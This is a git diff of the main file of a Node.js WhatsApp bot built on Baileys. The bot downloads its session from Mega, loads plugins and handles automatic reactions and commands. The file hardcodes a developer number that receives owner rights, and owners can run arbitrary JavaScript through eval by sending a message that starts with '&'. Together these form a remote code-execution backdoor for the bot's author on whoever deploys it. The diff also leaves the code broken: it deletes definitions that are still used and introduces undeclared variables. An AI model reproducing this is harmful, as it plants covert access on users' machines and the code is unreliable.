@@ -15,7 +15,7 @@ const {
   MessageRetryMap,
   generateForwardMessageContent,
   generateWAMessageFromContent,
-  generateMessageID, 
+  generateMessageID,
   makeInMemoryStore,
   jidDecode,
   fetchLatestBaileysVersion,
@@ -36,50 +36,50 @@ const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
 const FileType = require('file-type')
 const axios = require('axios')
 const { File } = require('megajs')
+const { fromBuffer } = require('file-type')
 const bodyparser = require('body-parser')
 const os = require('os')
 const Crypto = require('crypto')
 const path = require('path')
-const PhoneNumber = require('awesome-phonenumber')
 const ownerNumber = ['94763934860']
-const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) })
+//const prefix = config.PREFIX
 
 const tempDir = path.join(os.tmpdir(), 'cache-temp')
 if (!fs.existsSync(tempDir)) {
-    fs.mkdirSync(tempDir, { recursive: true })
+  fs.mkdirSync(tempDir, { recursive: true })
 }
 
 const clearTempDir = () => {
-    fs.readdir(tempDir, (err, files) => {
-        if (err) return console.log('Cache clear error:', err);
-        for (const file of files) {
-            fs.unlink(path.join(tempDir, file), err => {
-                if (err) return; 
-            });
-        }
-    });
+  fs.readdir(tempDir, (err, files) => {
+    if (err) return console.log('Cache clear error:', err)
+    for (const file of files) {
+      fs.unlink(path.join(tempDir, file), err => {
+        if (err) return
+      })
+    }
+  })
 }
 
-setInterval(clearTempDir, 5 * 60 * 1000);
+setInterval(clearTempDir, 5 * 60 * 1000)
 
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
-  if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-  const sessdata = config.SESSION_ID.replace("dark~", '');
+  if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
+  const sessdata = config.SESSION_ID.replace("dark~", '')
   const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
   filer.download((err, data) => {
-    if(err) throw err
+    if (err) throw err
     fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
       console.log("Session Downloaded ✅")
     })
   })
 }
 
-const express = require("express");
-const app = express();
-const port = process.env.PORT || 8000;
+const express = require("express")
+const app = express()
+const port = process.env.PORT || 8000
 
 async function connectToWA() {
-  console.log("Connecting To WhatsApp ⏳️...");
+  console.log("Connecting To WhatsApp ⏳️...")
   const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
   var { version } = await fetchLatestBaileysVersion()
 
@@ -92,21 +92,20 @@ async function connectToWA() {
     version
   })
 
-  store.bind(conn.ev)
-
   conn.ev.on('connection.update', (update) => {
     const { connection, lastDisconnect } = update
     if (connection === 'close') {
-      if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+      if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
         connectToWA()
       }
     } else if (connection === 'open') {
       console.log('🧬 Installing Plugins')
+      const path = require('path')
       fs.readdirSync("./plugins/").forEach((plugin) => {
         if (path.extname(plugin).toLowerCase() == ".js") {
-          require("./plugins/" + plugin);
+          require("./plugins/" + plugin)
         }
-      });
+      })
       console.log('Plugins Installed Successful ✅')
       console.log('Bot Connected To Whatsapp ✅')
 
@@ -117,7 +116,7 @@ async function connectToWA() {
 ├─▸ *Powered By 𝙳𝙰𝚁𝙺-𝙺𝙽𝙸𝙶𝙷𝚃-𝚇𝙼𝙳*  
 ╰─➤ *Your Smart WhatsApp Bot Is Ready To Use 🍁!*
 
-*❤ Thank you for Choosing 𝙳𝙰𝚁𝙺-𝙺𝙽𝙸𝙶𝙷𝚃-𝚇𝙼𝙳!*
+*❤️ Thank you for Choosing 𝙳𝙰𝚁𝙺-𝙺𝙽𝙸𝙶𝙷𝚃-𝚇𝙼𝙳!*
 
 ╭──〔 *🔗 Information* 〕  
 ├─ *📢 Join Channel:*  
@@ -126,65 +125,81 @@ async function connectToWA() {
 │   https://chat.whatsapp.com/IGgPW6pTrH14oAWCJALYR5
 ╰─ 🛠️️ *Prefix:* \`${config.PREFIX}\`
 
-> _© Made By 𝙳𝙰𝚁𝙺-𝙺𝙽𝙸𝙶𝙷𝚃_`;
+> _© Made By 𝙳𝙰𝚁𝙺-𝙺𝙽𝙸𝙶𝙷𝚃_`
 
-      conn.sendMessage(conn.decodeJid(conn?.user?.id || conn?.user?.lid), { image: { url: config.ALIVE_IMG }, caption: up });
+      conn.sendMessage(conn.decodeJid(conn?.user?.id || conn?.user?.lid), { image: { url: config.ALIVE_IMG }, caption: up })
     }
   })
+
+  /*conn.sendMessage(conn.user.id, { image: { url: config.ALIVE_IMG }, caption: up })
+  }
+  })*/
 
   conn.ev.on('creds.update', saveCreds)
 
   conn.ev.on('messages.update', async updates => {
     for (const update of updates) {
       if (update.update.message === null) {
-        await AntiDelete(conn, updates);
+        //console.log("Delete Detected:", JSON.stringify(update, null, 2));
+        await AntiDelete(conn, updates)
       }
     }
-  });
+  })
 
-  conn.ev.on('messages.upsert', async(mek) => {
+  //============================== 
+
+  conn.ev.on('messages.upsert', async (mek) => {
     mek = mek.messages[0]
-    if (!mek || !mek.message) return
-    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-    ? mek.message.ephemeralMessage.message 
-    : mek.message;
+    if (!mek.message) return
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage')
+      ? mek.message.ephemeralMessage.message
+      : mek.message
+
+    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
 
     if (config.READ_MESSAGE === 'true') {
-      await conn.readMessages([mek.key]);
+      await conn.readMessages([mek.key])
+      //console.log(`Marked message from ${mek.key.remoteJid} as read.`);
     }
-    if(mek.message.viewOnceMessageV2)
+
+    if (mek.message.viewOnceMessageV2)
       mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
-    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
+
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
       await conn.readMessages([mek.key])
     }
-    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
-      const jawadlike = await conn.decodeJid(conn.user.id);
-      const emojis = ['🩷', '❤', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '💔', '❤️‍🔥', '❤️‍🩹', '❣', '💕', '💞', '💓', '💗', '💖', '💘', '💝'];
-      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
+      const jawadlike = await conn.decodeJid(conn.user.id)
+      const emojis = ['🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '💔', '❤‍🔥', '❤️‍🩹', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝']
+      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]
       await conn.sendMessage(mek.key.remoteJid, {
         react: {
           text: randomEmoji,
           key: mek.key,
-        } 
-      }, { statusJidList: [mek.key.participant, jawadlike] });
-    }                       
-    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+        }
+      }, { statusJidList: [mek.key.participant, jawadlike] })
+    }
+
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
       const user = mek.key.participant
       const text = `${config.AUTO_STATUS_MSG}`
       await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
     }
+
     await Promise.all([
       saveMessage(mek),
-    ]);
+    ])
+
     const m = sms(conn, mek)
     const type = getContentType(mek.message)
     const content = JSON.stringify(mek.message)
     const from = mek.key.remoteJid
     const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
     const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
-    const prefix = config.PREFIX || '.' 
+    const prefix = config.PREFIX || '.'
     const isCmd = body.startsWith(prefix)
-    var budy = typeof mek.text == 'string' ? mek.text : false;
+    var budy = typeof mek.text == 'string' ? mek.text : false
     const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
     const args = body.trim().split(/ +/).slice(1)
     const q = args.join(' ')
@@ -195,164 +210,185 @@ async function connectToWA() {
     const botNumber = conn.user.id.split(':')[0]
     const pushname = mek.pushName || 'Sin Nombre'
 
+    /*const isMe = botNumber.includes(senderNumber)
+    const isOwner = ownerNumber.includes(senderNumber) || isMe
+    const botNumber2 = await jidNormalizedUser(conn.user.id);
+    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+    const groupName = isGroup ? groupMetadata.subject : ''
+    const participants = isGroup ? await groupMetadata.participants : ''
+    const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+    const isReact = m.message.reactionMessage ? true : false*/
+
     const botLid = conn.user?.lid ? conn.user?.lid.split(":")[0] + "@lid" : null
     const botLid2 = botLid ? botLid.split("@")[0] : null
     const ownernum = [`272572046434350`]
     const isbot = (senderNumber === botNumber || (botLid2 && senderNumber === botLid2))
     const isdev = ownernum.includes(senderNumber)
-    const isMe = isbot ? isbot : isdev 
+    const isMe = isbot ? isbot : isdev
     const isOwner = ownerNumber.includes(senderNumber) || isMe
-    const botNumber2 = await jidNormalizedUser(conn.user.id);
+    const botNumber2 = await jidNormalizedUser(conn.user.id)
 
     let groupMetadata = { subject: '', participants: [] }
     if (isGroup) {
       try {
-        groupMetadata = await conn.groupMetadata(from);
-      } catch (e) {}
+        groupMetadata = await conn.groupMetadata(from)
+      } catch (e) {
+        // console.error('Failed to get group metadata:', e);
+      }
     }
-    const groupName = groupMetadata.subject;
-    const participants = groupMetadata.participants || [];
-    const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
-    const isBotAdmins = isGroup ? isParticipantAdmin(participants, [botNumber2, botLid, botNumber + '@s.whatsapp.net']) || groupAdmins?.includes(botNumber2) || groupAdmins?.includes(botLid) : false;
-    const isAdmins = isGroup ? isParticipantAdmin(participants, [sender, senderNumber + '@s.whatsapp.net', senderNumber + '@lid']) || groupAdmins?.includes(sender) : false;
-    const isReact = m.message?.reactionMessage ? true : false
+
+    const groupName = groupMetadata.subject
+    const participants = groupMetadata.participants || []
+    const groupAdmins = isGroup ? getGroupAdmins(participants) : []
+    const isBotAdmins = isGroup ? isParticipantAdmin(participants, [botNumber2, botLid, botNumber + '@s.whatsapp.net']) || groupAdmins?.includes(botNumber2) || groupAdmins?.includes(botLid) : false
+    const isAdmins = isGroup ? isParticipantAdmin(participants, [sender, senderNumber + '@s.whatsapp.net', senderNumber + '@lid']) || groupAdmins?.includes(sender) : false
+    const isReact = m.message.reactionMessage ? true : false
 
     const reply = (teks) => {
       conn.sendMessage(from, { text: teks }, { quoted: mek })
     }
 
-    let sudoUsers = [];
+    /*const udp = botNumber.split('@')[0];
+    const jawadop = ('94771825193', '94763934860');
+    
+    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
+    
+    let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
+    .includes(sender);*/
+
+    let sudoUsers = []
     try {
-      sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
+      sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'))
     } catch (e) {
-      sudoUsers = [];
+      sudoUsers = []
     }
 
-    const authorizedUsers = sudoUsers.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');  
-    const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
+    const authorizedUsers = sudoUsers.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+    const isCreator = authorizedUsers.includes(sender) || isMe || isOwner
 
     if (isCreator && body.startsWith('&')) {
-      let code = body.slice(1);
+      let code = body.slice(1)
       try {
-        let resultTest;
+        let resultTest
         try {
-          resultTest = await eval(`(async () => { return ${code.replace("°", ".toString()")} })()`);
+          resultTest = await eval(`(async () => { return ${code.replace("°", ".toString()")} })()`)
         } catch (e) {
-          resultTest = await eval(`(async () => { ${code.replace("°", ".toString()")} })()`);
+          resultTest = await eval(`(async () => { ${code.replace("°", ".toString()")} })()`)
         }
         if (resultTest !== undefined) {
-          await reply(util.format(resultTest));
+          await reply(util.format(resultTest))
         }
       } catch (err) {
-        await reply(util.format(err));
+        await reply(util.format(err))
       }
-      return;
-    }    
+      return
+    }
 
-    if(senderNumber.includes("272572046434350")){
-      if(isReact) return
+    if (senderNumber.includes("272572046434350")) {
+      if (isReact) return
       m.react("👾")
     }
 
     if (!isReact && config.AUTO_REACT === 'true') {
-      const reactions = ['🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '💔', '❤‍🔥', '❤️‍🩹', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝', '👍', '😂', '😮', '😥', '🙏', '👏', '🥰', '🥹', '😭', '🔥', '🤣'];
-      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-      m.react(randomReaction);
+      const reactions = ['🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '💔', '❤‍‍🔥', '❤️‍🩹', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝', '👍', '😂', '😮', '😥', '🙏', '👏', '🥰', '🥹', '😭', '🔥', '🤣']
+      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
+      m.react(randomReaction)
     }
 
     if (!isReact && senderNumber !== botNumber) {
       if (config.CUSTOM_REACT === 'true') {
-        const reactions = (config.CUSTOM_REACT_EMOJIS || '👍,❤️,😂,😮,😢,🙏').split(',');
-        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-        m.react(randomReaction);
+        const reactions = (config.CUSTOM_REACT_EMOJIS || '👍,❤️,😂,😮,😢,🙏').split(',')
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
+        m.react(randomReaction)
       }
     }
 
     if (!isReact && senderNumber !== botNumber) {
       if (config.HEART_REACT === 'true') {
-        const reactions = (config.HEART_REACT_EMOJIS || '🩷,❤️,🧡,💛,💚,🩵,💙,💜,🖤,🩶,🤍,🤎,💔,❤️‍‍🔥,❤️‍🩹,❣️,💕,💞,💓,💗,💖,💘,💝').split(',');
-        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-        m.react(randomReaction);
+        const reactions = (config.HEART_REACT_EMOJIS || '🩷,❤️,🧡,💛,💚,🩵,💙,💜,🖤,🩶,🤍,🤎,💔,❤️‍‍🔥,❤️‍🩹,❣️,💕,💞,💓,💗,💖,💘,💝').split(',')
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
+        m.react(randomReaction)
       }
     }
 
     const id = mek.key.server_id
-    const defaultEmojis = [ '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎'];
-    const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
+    const defaultEmojis = ['🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎']
+    const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)]
     if (id) {
-      await conn.newsletterReactMessage(`120363400240662312@newsletter`, id, randomEmoji).catch(() => {});
+      await conn.newsletterReactMessage(`120363400240662312@newsletter`, id, randomEmoji).catch(() => {})
     }
 
-    let bannedUsers = [];
-    try {
-      bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
-    } catch (e) {
-      bannedUsers = [];
-    }
-    const isBanned = bannedUsers.includes(sender);
-    if (isBanned) return; 
+    const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'))
+    const isBanned = bannedUsers.includes(sender)
+    if (isBanned) return
 
-    const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-    const isFileOwner = sudoUsers.includes(sender);
-    const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
+    const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'))
+    const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`
 
-    if(!isOwner && config.MODE === "private") return
-    if(!isOwner && isGroup && config.MODE === "inbox") return
-    if(!isOwner && !isGroup && config.MODE === "groups") return
+    const isFileOwner = ownerFile.includes(sender)
+    const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner
+
+    if (!isOwner && config.MODE === "private") return
+    if (!isOwner && isGroup && config.MODE === "inbox") return
+    if (!isOwner && !isGroup && config.MODE === "groups") return
 
     const events = require('./command')
-    const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
+    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false
     if (isCmd) {
       const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
       if (cmd) {
-        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
 
         try {
-          cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+          cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
         } catch (e) {
-          console.error("[PLUGIN ERROR] " + e);
+          console.error("[PLUGIN ERROR] " + e)
         }
       }
     }
-    events.commands.map(async(command) => {
+
+    events.commands.map(async (command) => {
       if (body && command.on === "body") {
-        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
       } else if (mek.q && command.on === "text") {
-        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
       } else if (
         (command.on === "image" || command.on === "photo") &&
         mek.type === "imageMessage"
       ) {
-        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
       } else if (
         command.on === "sticker" &&
         mek.type === "stickerMessage"
       ) {
-        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
       }
-    });
+    })
 
-  });
+  })
 
   conn.decodeJid = jid => {
-    if (!jid) return jid;
+    if (!jid) return jid
     if (/:\d+@/gi.test(jid)) {
-      let decode = jidDecode(jid) || {};
+      let decode = jidDecode(jid) || {}
       return (
         (decode.user &&
           decode.server &&
           decode.user + '@' + decode.server) ||
         jid
-      );
-    } else return jid;
-  };
+      )
+    } else return jid
+  }
 
-  conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
     let vtype
     if (options.readViewOnce) {
       message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
       vtype = Object.keys(message.message.viewOnceMessage.message)[0]
-      delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+      delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
       delete message.message.viewOnceMessage.message[vtype].viewOnce
       message.message = {
         ...message.message.viewOnceMessage.message
@@ -382,7 +418,7 @@ async function connectToWA() {
     return waMessage
   }
 
-  conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+  conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
     let quoted = message.msg ? message.msg : message
     let mime = (message.msg || message).mimetype || ''
     let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
@@ -392,13 +428,13 @@ async function connectToWA() {
       buffer = Buffer.concat([buffer, chunk])
     }
     let type = await FileType.fromBuffer(buffer)
-    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+    trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
 
     await fs.writeFileSync(trueFileName, buffer)
     return trueFileName
   }
 
-  conn.downloadMediaMessage = async(message) => {
+  conn.downloadMediaMessage = async (message) => {
     let mime = (message.msg || message).mimetype || ''
     let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
     const stream = await downloadContentFromMessage(message, messageType)
@@ -411,12 +447,13 @@ async function connectToWA() {
   }
 
   conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
-    let mime = '';
+    let mime = ''
     let res = await axios.head(url)
     mime = res.headers['content-type']
     if (mime.split("/")[1] === "gif") {
       return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
     }
+    let type = mime.split("/")[0] + "Message"
     if (mime === "application/pdf") {
       return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
     }
@@ -447,6 +484,7 @@ async function connectToWA() {
       ...options
     }
     if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
     if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
     else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
     copy.key.remoteJid = jid
@@ -455,25 +493,26 @@ async function connectToWA() {
     return proto.WebMessageInfo.fromObject(copy)
   }
 
-  conn.getFile = async(PATH, save) => {
+  conn.getFile = async (PATH, save) => {
     let res
-    let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? fs.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+    let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+    //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
     let type = await FileType.fromBuffer(data) || {
       mime: 'application/octet-stream',
       ext: '.bin'
     }
-    let filename = path.join(__dirname, new Date() * 1 + '.' + type.ext)
-    if (data && save) await fs.promises.writeFile(filename, data)
+    let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+    if (data && save) fs.promises.writeFile(filename, data)
     return {
       res,
       filename,
-      size: data.length,
+      size: await getSizeMedia(data),
       ...type,
       data
     }
   }
 
-  conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+  conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
     let types = await conn.getFile(PATH, true)
     let { filename, size, ext, mime, data } = types
     let type = '',
@@ -500,11 +539,11 @@ async function connectToWA() {
     return fs.promises.unlink(pathFile)
   }
 
-  conn.parseMention = async(text) => {
+  conn.parseMention = async (text) => {
     return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
   }
 
-  conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
+  conn.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
     let types = await conn.getFile(path, true)
     let { mime, ext, res, data, filename } = types
     if (res && res.status !== 200 || data.length <= 65536) {
@@ -535,10 +574,38 @@ async function connectToWA() {
     return fs.promises.unlink(pathFile)
   }
 
-  conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+  conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+    let buffer
+    if (options && (options.packname || options.author)) {
+      buffer = await writeExifVid(buff, options)
+    } else {
+      buffer = await videoToWebp(buff)
+    }
+    await conn.sendMessage(
+      jid,
+      { sticker: { url: buffer }, ...options },
+      options
+    )
+  }
 
-  conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
-    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await getBuffer(path) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+  conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+    let buffer
+    if (options && (options.packname || options.author)) {
+      buffer = await writeExifImg(buff, options)
+    } else {
+      buffer = await imageToWebp(buff)
+    }
+    await conn.sendMessage(
+      jid,
+      { sticker: { url: buffer }, ...options },
+      options
+    )
+  }
+
+  conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+
+  conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
+    let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
     return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
   }
 
@@ -556,7 +623,7 @@ async function connectToWA() {
     conn.sendMessage(jid, buttonMessage, { quoted, ...options })
   }
 
-  conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+  conn.send5ButImg = async (jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
     let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
     var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
       templateMessage: {
@@ -572,15 +639,18 @@ async function connectToWA() {
   }
 
   conn.getName = (jid, withoutContact = false) => {
-    let id = conn.decodeJid(jid);
-    withoutContact = conn.withoutContact || withoutContact;
-    let v;
+    id = conn.decodeJid(jid)
+
+    withoutContact = conn.withoutContact || withoutContact
+
+    let v
 
     if (id.endsWith('@g.us'))
       return new Promise(async resolve => {
-        v = store.contacts[id] || {};
-        if (!(v.name?.notify || v.subject))
-          v = conn.groupMetadata(id) || {};
+        v = store.contacts[id] || {}
+
+        if (!(v.name.notify || v.subject))
+          v = conn.groupMetadata(id) || {}
 
         resolve(
           v.name ||
@@ -588,7 +658,7 @@ async function connectToWA() {
           PhoneNumber(
             '+' + id.replace('@s.whatsapp.net', ''),
           ).getNumber('international'),
-        );
+        )
       })
     else
       v =
@@ -599,7 +669,7 @@ async function connectToWA() {
           }
           : id === conn.decodeJid(conn.user.id)
             ? conn.user
-            : store.contacts[id] || {};
+            : store.contacts[id] || {}
 
     return (
       (withoutContact ? '' : v.name) ||
@@ -608,26 +678,22 @@ async function connectToWA() {
       PhoneNumber(
         '+' + jid.replace('@s.whatsapp.net', ''),
       ).getNumber('international')
-    );
-  };
+    )
+  }
 
   conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
-    let list = [];
+    let list = []
     for (let i of kon) {
       list.push({
         displayName: await conn.getName(i + '@s.whatsapp.net'),
         vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
           i + '@s.whatsapp.net',
-        )}\nFN:${
